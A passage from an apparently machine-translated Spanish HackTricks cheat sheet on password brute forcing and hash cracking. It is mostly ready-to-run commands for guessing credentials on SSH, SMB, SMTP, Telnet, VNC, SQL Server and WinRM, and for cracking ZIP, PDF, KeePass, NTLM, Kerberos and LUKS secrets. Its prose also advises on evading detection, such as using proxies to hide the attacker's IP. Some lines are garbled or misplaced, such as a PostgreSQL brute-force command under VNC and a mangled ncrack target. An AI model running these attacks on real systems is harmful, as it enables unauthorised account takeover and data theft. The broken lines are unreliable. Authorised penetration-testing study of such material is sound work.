SNMP (Simple Network Management Protocol) es un protocolo utilizado para administrar y supervisar dispositivos de red. Es comúnmente utilizado en dispositivos de red como routers, switches, servidores y firewalls. SNMP utiliza una estructura de datos jerárquica para organizar la información de administración de red. 

Los atacantes pueden utilizar SNMP para obtener información sensible sobre la red, como nombres de host, direcciones IP y detalles de configuración. También pueden utilizar SNMP para realizar ataques de fuerza bruta contra contraseñas débiles o predeterminadas en dispositivos de red. 

Para protegerse contra los ataques de fuerza bruta de SNMP, es importante utilizar contraseñas fuertes y personalizadas en los dispositivos de red. También se recomienda deshabilitar SNMP en los dispositivos que no lo necesitan y limitar el acceso a los dispositivos que lo utilizan.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

El Protocolo de Bloques de Mensajes del Servidor (SMB, por sus siglas en inglés) es un protocolo de red utilizado para compartir archivos, impresoras y otros recursos entre nodos de una red. Es utilizado principalmente en sistemas operativos Windows, pero también puede ser utilizado en otros sistemas operativos.

#### Fuerza Bruta

La fuerza bruta en SMB se puede utilizar para intentar adivinar contraseñas de usuarios. Hay varias herramientas disponibles para realizar ataques de fuerza bruta en SMB, como Hydra y SMBMap.

Para realizar un ataque de fuerza bruta en SMB, primero se necesita una lista de posibles contraseñas. Luego, se utiliza una herramienta de fuerza bruta para intentar todas las combinaciones posibles de nombres de usuario y contraseñas hasta que se encuentre la correcta.

Es importante tener en cuenta que los ataques de fuerza bruta pueden ser detectados por los sistemas de seguridad y pueden llevar a la cuenta de usuario bloqueada o a la cuenta de atacante bloqueada. Por lo tanto, se recomienda utilizar técnicas de ataque más avanzadas y menos intrusivas, como la explotación de vulnerabilidades conocidas o la ingeniería social.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP (Simple Mail Transfer Protocol) es un protocolo utilizado para enviar correos electrónicos a través de Internet. Los servidores SMTP autenticados suelen requerir credenciales de inicio de sesión válidas para enviar correos electrónicos. 

#### Fuerza bruta

La fuerza bruta en los servidores SMTP se puede utilizar para adivinar credenciales de inicio de sesión válidas. Esto se puede hacer utilizando herramientas como Hydra o Medusa. También se pueden utilizar listas de contraseñas comunes para intentar adivinar la contraseña correcta. 

Además, se puede intentar adivinar el nombre de usuario correcto utilizando técnicas de enumeración de usuarios. Esto se puede hacer utilizando herramientas como Metasploit o Nmap. 

Es importante tener en cuenta que la fuerza bruta en los servidores SMTP puede ser detectada fácilmente por los sistemas de seguridad, por lo que se deben tomar medidas para evitar la detección, como limitar el número de intentos de inicio de sesión o utilizar proxies para ocultar la dirección IP del atacante.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) es un protocolo de red que permite a los usuarios de una red privada acceder a Internet de forma segura y anónima. SOCKS actúa como un intermediario entre el cliente y el servidor, permitiendo que el tráfico de red se enrute a través de un servidor proxy. Esto puede ser útil para ocultar la dirección IP del cliente y evitar la detección de actividades maliciosas. Los servidores SOCKS también pueden ser utilizados para eludir las restricciones de red, como los cortafuegos y los filtros de contenido.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

El protocolo SSH (Secure Shell) es un protocolo de red que permite a los usuarios conectarse y comunicarse de forma segura con un servidor remoto. SSH utiliza técnicas de cifrado para proteger la información transmitida y autenticación para garantizar que solo los usuarios autorizados puedan acceder al servidor. 

El ataque de fuerza bruta contra SSH implica intentar adivinar la contraseña correcta para una cuenta de usuario mediante la prueba de diferentes combinaciones de contraseñas. Los atacantes pueden utilizar herramientas automatizadas para realizar este tipo de ataque. Para evitar este tipo de ataque, se recomienda utilizar contraseñas seguras y complejas, así como la autenticación de dos factores. También se puede limitar el número de intentos de inicio de sesión fallidos permitidos antes de bloquear la cuenta de usuario.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Claves SSH débiles / PRNG predecible de Debian
Algunos sistemas tienen fallas conocidas en la semilla aleatoria utilizada para generar material criptográfico. Esto puede resultar en un espacio de claves dramáticamente reducido que puede ser atacado por fuerza bruta con herramientas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). También están disponibles conjuntos pregenerados de claves débiles, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet es un protocolo de red que permite la comunicación bidireccional utilizando un canal virtual. Es utilizado principalmente para la administración remota de dispositivos de red a través de una conexión de red. Telnet es un protocolo sin cifrado, lo que significa que la información transmitida a través de Telnet no está protegida y puede ser interceptada por un atacante. Por lo tanto, es importante evitar el uso de Telnet para la administración remota y en su lugar utilizar protocolos seguros como SSH. 

Sin embargo, en algunos casos, Telnet puede ser utilizado para realizar ataques de fuerza bruta contra servicios que utilizan este protocolo. En estos casos, se puede utilizar una herramienta de fuerza bruta como Hydra o Medusa para intentar adivinar las credenciales de acceso. Es importante tener en cuenta que este tipo de ataques son ilegales y pueden tener consecuencias graves.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) es un protocolo que permite controlar remotamente un ordenador a través de una red. Es muy utilizado en entornos de soporte técnico y administración de sistemas. 

El ataque de fuerza bruta contra VNC consiste en intentar adivinar la contraseña de acceso al servidor VNC. Para ello, se utilizan herramientas como Hydra o Medusa, que permiten automatizar el proceso de prueba de contraseñas. 

Es importante tener en cuenta que, en muchos casos, los servidores VNC no están configurados de forma segura, lo que facilita el éxito del ataque de fuerza bruta. Por lo tanto, es recomendable utilizar contraseñas seguras y configurar adecuadamente el servidor VNC para evitar este tipo de ataques.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm es un protocolo de administración remota de Windows que permite a los usuarios administrar y ejecutar comandos en sistemas remotos. Es similar a SSH en sistemas Unix y Linux. Winrm utiliza el puerto 5985 para conexiones HTTP y el puerto 5986 para conexiones HTTPS. 

La autenticación en Winrm se puede realizar mediante credenciales de usuario o mediante certificados. Si se utiliza la autenticación basada en certificados, se debe tener en cuenta que el certificado debe ser válido y estar instalado en ambos sistemas, el local y el remoto. 

Una técnica común de ataque en Winrm es la fuerza bruta de contraseñas. Los atacantes pueden utilizar herramientas como Hydra o Medusa para intentar adivinar las credenciales de usuario y contraseña. Para evitar este tipo de ataques, se recomienda utilizar contraseñas seguras y políticas de bloqueo de cuentas después de varios intentos fallidos de inicio de sesión.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilice [**Trickest**](https://trickest.io/) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de datos de cracking en línea

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 y SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 y archivos MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes y hashes de archivos)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Revise esto antes de intentar hacer fuerza bruta a un Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip 
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Ataque de texto plano conocido en archivos zip

Es necesario conocer el **texto plano** (o parte del texto plano) **de un archivo contenido dentro** del archivo zip cifrado. Puedes verificar **los nombres y tamaños de los archivos contenidos dentro** de un archivo zip cifrado ejecutando: **`7z l encrypted.zip`**\
Descarga [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) desde la página de lanzamientos.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd 
unzip unlocked.zip #User new_pwd as password
```
### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

El formato de archivo PDF (Portable Document Format) es ampliamente utilizado para compartir documentos en línea. A menudo, estos documentos contienen información confidencial y pueden ser un objetivo atractivo para los atacantes. Los atacantes pueden intentar realizar ataques de fuerza bruta contra los archivos PDF protegidos con contraseña para obtener acceso no autorizado a la información contenida en ellos.

Los ataques de fuerza bruta contra archivos PDF protegidos con contraseña pueden realizarse utilizando herramientas como `pdfcrack` o `hashcat`. Estas herramientas intentan adivinar la contraseña probando diferentes combinaciones de caracteres hasta que se encuentra la correcta. Es importante tener en cuenta que cuanto más larga y compleja sea la contraseña, más difícil será para el atacante adivinarla.

Además, los atacantes también pueden intentar explotar vulnerabilidades en el software de lectura de PDF para obtener acceso no autorizado a la información contenida en los archivos. Por lo tanto, es importante mantener el software de lectura de PDF actualizado con las últimas actualizaciones de seguridad para reducir el riesgo de explotación de vulnerabilidades.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Contraseña de propietario de PDF

Para crackear una contraseña de propietario de PDF, revisa esto: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Descifrado de NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass es un gestor de contraseñas de código abierto que permite almacenar y gestionar de forma segura contraseñas y otros datos sensibles. Utiliza una base de datos cifrada con una contraseña maestra para proteger la información almacenada. Keepass también cuenta con funciones de generación de contraseñas aleatorias y autocompletado de formularios web.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting es una técnica de ataque que aprovecha la debilidad de la encriptación Kerberos en entornos Windows para extraer contraseñas de usuarios con privilegios de cuenta de servicio. El atacante puede extraer los hashes de contraseñas de estas cuentas de servicio y luego utilizar herramientas de cracking para obtener las contraseñas en texto plano. 

Para llevar a cabo un ataque de Keberoasting, el atacante necesita tener acceso a una cuenta de usuario con privilegios de cuenta de servicio en el dominio de Windows. Luego, el atacante utiliza una herramienta como "Rubeus" para extraer los hashes de contraseñas de las cuentas de servicio. Estos hashes se pueden guardar en un archivo y luego se pueden utilizar herramientas de cracking como "Hashcat" para obtener las contraseñas en texto plano.

Para prevenir un ataque de Keberoasting, se recomienda limitar el número de cuentas de servicio con privilegios en el dominio de Windows y asegurarse de que las contraseñas de estas cuentas sean lo suficientemente fuertes. También se puede implementar la autenticación multifactor para las cuentas de servicio con privilegios para aumentar la seguridad.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Imagen de Lucks

#### Método 1

Instalar: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Método 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
### Mysql

Mysql es un sistema de gestión de bases de datos relacional de código abierto muy popular. Es utilizado por muchas aplicaciones web y es una de las bases de datos más utilizadas en la web. Debido a su popularidad, es un objetivo común para los atacantes.

#### Fuerza bruta

La fuerza bruta es una técnica común utilizada para obtener acceso no autorizado a una base de datos Mysql. Consiste en probar todas las posibles combinaciones de contraseñas hasta encontrar la correcta. Es importante tener en cuenta que esta técnica puede ser muy lenta y puede requerir una gran cantidad de recursos.

#### Herramientas de fuerza bruta

Hay muchas herramientas de fuerza bruta disponibles para Mysql, como Hydra, Medusa y SQLMap. Estas herramientas pueden ser muy efectivas si se utilizan correctamente, pero también pueden ser peligrosas si se utilizan de manera incorrecta.

Es importante tener en cuenta que la fuerza bruta es ilegal y puede tener graves consecuencias legales. Por lo tanto, solo debe ser utilizada en sistemas que usted tiene permiso para probar.
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clave privada PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Utilice [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) y luego john

### Columna protegida por contraseña en Open Office

Si tiene un archivo xlsx con una columna protegida por contraseña, puede desprotegerla:

* **Cárguelo en Google Drive** y la contraseña se eliminará automáticamente
* Para **eliminarla manualmente**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificados PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.io/) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas de la comunidad más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Herramientas

**Ejemplos de hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Listas de palabras

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Herramientas de generación de listas de palabras**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generador avanzado de teclado con caracteres base configurables, mapa de teclas y rutas.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutación de John

Leer _**/etc/john/john.conf**_ y configurarlo.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Ataques de Hashcat

* **Ataque de lista de palabras** (`-a 0`) con reglas

**Hashcat** ya viene con una **carpeta que contiene reglas**, pero puedes encontrar [**otras reglas interesantes aquí**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* Ataque de **combinación de listas de palabras**

Es posible **combinar 2 listas de palabras en 1** con hashcat.\
Si la lista 1 contenía la palabra **"hello"** y la segunda contenía 2 líneas con las palabras **"world"** y **"earth"**. Las palabras `helloworld` y `helloearth` serán generadas.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Ataque de máscara** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Ataque de Wordlist + Máscara (`-a 6`) / Máscara + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modos de Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Crackeando Hashes de Linux - Archivo /etc/shadow

El archivo `/etc/shadow` es un archivo de sistema en Linux que contiene información de autenticación de usuarios. Este archivo almacena los hashes de las contraseñas de los usuarios en lugar de las contraseñas en texto plano. 

Para crackear hashes de contraseñas en Linux, primero debemos obtener acceso al archivo `/etc/shadow`. Esto se puede hacer de varias maneras, como obtener acceso de root o explotar una vulnerabilidad en el sistema.

Una vez que tengamos acceso al archivo `/etc/shadow`, podemos utilizar herramientas como John the Ripper o Hashcat para crackear los hashes de las contraseñas. Estas herramientas utilizan técnicas de fuerza bruta y diccionario para intentar adivinar la contraseña original a partir del hash.

Es importante tener en cuenta que el cracking de hashes de contraseñas es ilegal sin el consentimiento explícito del propietario del sistema. Además, es importante utilizar contraseñas seguras y robustas para evitar que sean crackeadas fácilmente.
```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
Rompiendo Hashes de Windows

Para romper hashes de Windows, podemos utilizar herramientas como `hashcat` o `John the Ripper`. Ambas herramientas son capaces de romper hashes de Windows de forma eficiente.

Para utilizar `hashcat`, necesitamos una lista de palabras (wordlist) y el hash que queremos romper. Podemos utilizar el siguiente comando:

```
hashcat -m 1000 hash.txt wordlist.txt
```

Donde `-m 1000` indica que estamos rompiendo un hash de Windows, `hash.txt` es el archivo que contiene el hash que queremos romper y `wordlist.txt` es la lista de palabras que utilizaremos para intentar romper el hash.

Para utilizar `John the Ripper`, necesitamos un archivo que contenga los hashes de Windows que queremos romper. Podemos utilizar el siguiente comando:

```
john --format=NT hash.txt
```

Donde `--format=NT` indica que estamos rompiendo un hash de Windows y `hash.txt` es el archivo que contiene los hashes que queremos romper.

Ambas herramientas son muy eficientes y pueden romper hashes de Windows en cuestión de segundos o minutos, dependiendo de la complejidad del hash y de la lista de palabras utilizada.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
Rompiendo Hashes Comunes de Aplicaciones
```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utiliza [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas de la comunidad más avanzadas del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
